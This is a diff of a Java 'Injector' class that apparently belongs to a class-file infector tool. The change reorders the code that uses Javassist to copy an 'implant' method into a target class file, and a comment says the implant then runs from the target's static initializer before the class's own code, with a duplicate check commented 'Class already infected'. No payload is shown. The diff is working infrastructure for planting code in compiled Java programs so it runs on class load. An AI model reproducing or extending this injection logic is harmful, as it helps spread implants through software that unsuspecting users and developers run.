@@ -172,6 +172,26 @@ public class Injector {
         final ClassFile targetClass = readClassFile(targetClassFilePath);
         final ConstPool constPool = targetClass.getConstPool();
 
+        // Add the implant method to target class
+        MethodInfo targetImplantMethod;
+        try {
+            // Construct a target method from the source (implant) method
+            targetImplantMethod = new MethodInfo(constPool, implantMethod.getName(), implantMethod.getDescriptor());
+            targetImplantMethod.setExceptionsAttribute(implantMethod.getExceptionsAttribute());
+            HashMap<String, String> classTranslation = new HashMap<>();
+            CodeAttribute copy = (CodeAttribute) implantMethod.getCodeAttribute().copy(constPool, classTranslation);
+            copy.setMaxLocals(1);  // Don't know why this is necessary, but it throws an error otherwise
+            setStaticFlagForMethod(targetImplantMethod);
+
+            targetImplantMethod.getAttributes().removeIf(Objects::isNull);  // Cringe workaround due to internal bug in Javassist
+            targetImplantMethod.setCodeAttribute(copy);
+
+            targetClass.addMethod(targetImplantMethod);
+        } catch (DuplicateMemberException e) {
+            // Class already infected
+            return false;
+        }
+
         MethodInfo currentClinit = targetClass.getMethod(MethodInfo.nameClinit);
         if (currentClinit == null) {
             // There are no static blocks in this class, create an empty one
@@ -188,26 +208,6 @@ public class Injector {
             } catch (DuplicateMemberException e) {
                 throw new RuntimeException("Internal error: clinit already exist despite not existing", e);
             }
-        }
-
-        // Add the implant method to target class
-        MethodInfo targetImplantMethod;
-        try {
-            // Construct a target method from the source (implant) method
-            targetImplantMethod = new MethodInfo(constPool, implantMethod.getName(), implantMethod.getDescriptor());
-            targetImplantMethod.setExceptionsAttribute(implantMethod.getExceptionsAttribute());
-            HashMap<String, String> classTranslation = new HashMap<>();
-            CodeAttribute copy = (CodeAttribute) implantMethod.getCodeAttribute().copy(constPool, classTranslation);
-            copy.setMaxLocals(10);  // Don't know why this is necessary, but it throws an error otherwise
-            setStaticFlagForMethod(targetImplantMethod);
-
-            targetImplantMethod.getAttributes().removeIf(Objects::isNull);  // Cringe workaround due to internal bug in Javassist
-            targetImplantMethod.setCodeAttribute(copy);
-
-            targetClass.addMethod(targetImplantMethod);
-        } catch (DuplicateMemberException e) {
-            // Class already infected
-            return false;
         }
 
         // Modify the clinit method of the target class to run the implant method (before its own code)
